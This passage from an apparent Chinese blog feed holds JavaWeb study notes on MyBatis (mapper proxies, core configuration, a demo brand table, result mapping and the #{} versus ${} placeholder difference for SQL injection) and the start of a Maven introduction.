<span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.加载mybatis核心配置文件，获取sqlSessionFactory，这一段直接复制官网</span>        <span class="token comment">//配置文件工作路径直接在resources下找</span>        <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取SQLSession对象来执行SQL语句</span>        <span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.执行SQL语句</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span><span class="token string">"test.selectAll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.释放资源</span>        sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-mapper代理开发"><a class="markdownIt-Anchor" href="#3-mapper代理开发">#</a> 3、Mapper 代理开发</h1><ul><li>目的：<ul><li>解决原生方式中的硬编码</li><li>简化后期 SQL 执行</li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623073719183.png" alt="image-20220623073719183"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>UserMapper：接口，里面会有很多方法，会和配置文件里的 id 名称一一对应</p></blockquote><h2 id="31-使用mapper代理开发完成入门案例"><a class="markdownIt-Anchor" href="#31-使用mapper代理开发完成入门案例">#</a> 3.1 使用 Mapper 代理开发完成入门案例</h2><ol><li>定义与 SQL 映射文件同名的 Mapper 接口，并且将 Mapper 接口和 SQL 映射文件放置在同一目录下<ul><li>注意：maven 要求配置文件和 java 代码分开。因此不要将配置文件直接拖到代码目录，可以在 resources 目录下建立与 Mapper 接口同级别同名的目录树</li></ul></li><li>设置 SQL 映射文件的 namespace 属性为 Mapper 接口全限定名</li><li>在 Mapper 接口中定义方法，方法名就是 SQL 映射文件中 SQL 语句的 id，并保持参数类型和返回值一致</li><li>编码<ol><li>通过 SQLSession 的 getMapper 获取 Mapper 接口的代理对象</li><li>调用对应方法完成 SQL</li></ol></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074125895.png" alt="image-20220623074125895"></p><ol><li>目录树结构：</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074746739.png" alt="image-20220623074746739"></p><ol start="2"><li>映射的名称空间为接口的全限定名</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074925025.png" alt="image-20220623074925025"></p><ol start="3"><li>定义方法，方法名是映射文件 SQL 的 id，没有参数，返回值是一个 User 的集合，由于配置文件路径改了，要在 mybatis-config.xml 中更改 mapper resources 的路径</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623075054186.png" alt="image-20220623075054186"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623075243996.png" alt="image-20220623075243996"></p><p>4、编码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">UserMapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Resources</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactoryBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token comment">/** * mybatis代理开发 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.加载mybatis核心配置文件，获取sqlSessionFactory</span>        <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取SQLSession对象来执行SQL语句</span>        <span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取UserMapper接口的代理对象</span>        <span class="token class-name">UserMapper</span> userMapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.释放资源</span>        sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-mybatis核心配置文件"><a class="markdownIt-Anchor" href="#4-mybatis核心配置文件">#</a> 4、Mybatis 核心配置文件</h1><ul><li><p>核心配置文件：mybatis-config.xml</p></li><li><p>environments：环境，里面有 environment，可以配置多个不同的数据库，通过改变 default 来改变数据源</p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    配置数据库连接环境信息，可以配置多个environment，通过对应的default属性来切换数据库--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--                数据库配置--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///mybatis?useSSL=false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>typeAliases：别名，作用：将包目录下的类起一个别名，这样在 mapper 中就不需要写类的全名了，且不区分大小写</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;typeAliases&gt;&lt;package name&#x3D;&quot;com.itheima.pojo&#x2F;&quot;&gt;&lt;&#x2F;typeAliases&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623081008599.png" alt="image-20220623081008599"></p><ul><li>配置别名时要遵守标签顺序</li></ul><h1 id="5-配置文件完成增删改查"><a class="markdownIt-Anchor" href="#5-配置文件完成增删改查">#</a> 5、配置文件完成增删改查</h1><ul><li><p>要完成的功能列表清单</p><ol><li>查询<ul><li>查询所有数据</li><li>查看详情</li><li>条件查询</li></ul></li><li>添加</li><li>修改<ul><li>修改全部字段</li><li>修改动态字段</li></ul></li><li>删除<ul><li>删除一个</li><li>批量删除</li></ul></li></ol></li><li><p>准备环境</p><ul><li>数据库表 tb_brand</li><li>实体类 Brand</li><li>测试用例</li><li>安装 MyBatisX 插件</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 删除tb_brand表</span><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> tb_brand<span class="token punctuation">;</span><span class="token comment">-- 创建tb_brand表</span><span class="token keyword">create</span> <span class="token keyword">table</span> tb_brand<span class="token punctuation">(</span>    <span class="token comment">-- id 主键</span>    id           <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    <span class="token comment">-- 品牌名称</span>    brand_name   <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 企业名称</span>    company_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 排序字段</span>    ordered      <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token comment">-- 描述信息</span>    description  <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 状态：0：禁用  1：启用</span>    <span class="token keyword">status</span>       <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 添加数据</span><span class="token keyword">insert</span> <span class="token keyword">into</span> tb_brand <span class="token punctuation">(</span>brand_name<span class="token punctuation">,</span> company_name<span class="token punctuation">,</span> ordered<span class="token punctuation">,</span> description<span class="token punctuation">,</span> <span class="token keyword">status</span><span class="token punctuation">)</span><span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'三只松鼠'</span><span class="token punctuation">,</span> <span class="token string">'三只松鼠股份有限公司'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'好吃不上火'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token punctuation">(</span><span class="token string">'华为'</span><span class="token punctuation">,</span> <span class="token string">'华为技术有限公司'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'华为致力于把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token punctuation">(</span><span class="token string">'小米'</span><span class="token punctuation">,</span> <span class="token string">'小米科技有限公司'</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'are you ok'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tb_brand<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="51-查询所有数据"><a class="markdownIt-Anchor" href="#51-查询所有数据">#</a> 5.1 查询所有数据</h2><ol><li>编写接口方法：Mapper 接口<ul><li>参数：无</li><li>结果：List&lt;Brand&gt;</li></ul></li><li>编写 SQL 语句：SQL 映射文件</li><li>执行方法，测试</li></ol><ul><li><p>核心内容：SQL 语句怎么写，参数要什么，结果怎么处理</p></li><li><p>碰到的问题：数据库表的字段名称和实体类的属性名称不一样，则不能自动封装数据</p><ul><li><p>解决方法:</p><ol><li><p>起别名，对不一样的列明起别名，让列名和属性名一样</p></li><li><p>定义 SQL 片段</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sql</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_column<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    id,brand_name as brandName,company_name as companyName,ordered,description,status<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sql</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_column<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    from tb_brand;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>resultMap</p><ul><li>id：唯一标识</li><li>type：映射的类型，支持别名</li><li>字标签：id：完成主键字段的映射</li><li>字标签：result：完成一般字段的映射</li><li>属性：column（列名），property（实体类的属性名）</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_name<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>company_name<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>companyName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandResultMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select            *        from tb_brand;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ul></li></ul><h2 id="52-查询-查看详情"><a class="markdownIt-Anchor" href="#52-查询-查看详情">#</a> 5.2 查询 - 查看详情</h2><ul><li>参数占位符：<ul><li>#{}：使用预编译，将其替换为？，为防止 SQL 注入</li><li>${}：直接拼接参数，会存在 SQL 注入问题</li></ul></li><li>使用时机：<ul><li>传递参数的时候：#{}</li><li>表名或者列名不固定的情况下：${}，但是只要用 $ 就会存在注入问题</li></ul></li><li>特殊字符处理<ol><li>转义字符：xml 转义字符</li><li>CDATA 区：CD 补全</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-mybatis概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-mybatis概述&quot;&gt;#&lt;/a&gt; 1、Mybatis 概述&lt;/h1&gt;
&lt;h2 id=&quot;11-mybatis概念&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-Maven</title>
    <link href="http://example.com/post/JavaWeb-Maven.html"/>
    <id>http://example.com/post/JavaWeb-Maven.html</id>
    <published>2022-06-23T13:37:21.000Z</published>
    <updated>2022-06-23T13:42:28.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-maven概述"><a class="markdownIt-Anchor" href="#1-maven概述">#</a> 1、Maven 概述</h1><ul><li>Maven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：<ul><li>提供了一套标准化的项目结构</li><li>提供了一套标准化的构建流程（编译、测试、打包、发布）</li><li>提供了一套依赖管理机制</li></ul></li><li>标准化项目结构：</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622203730699.png" alt="image-20220622203730699"></p><ul><li>标准化构建流程：</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622203828981.png" alt="image-20220622203828981"></p><ul><li>提供了一套依赖管理机制</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622204124033.png" alt="image-20220622204124033"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li>Maven 简介</li><li>Maven 安装配置</li><li>Maven 基本使用</li><li>IDEA 配置 Maven</li><li>依赖管理</li></ul></blockquote><h1 id="2-maven简介"><a class="markdownIt-Anchor" href="#2-maven简介">#</a> 2、Maven 简介</h1><ul><li>Apache Maven 是一个项目管理和构建工具，它基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建、报告和文档</li><li>官网：<a href="http://maven.apache.org/">http://maven.apache.org/</a></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" 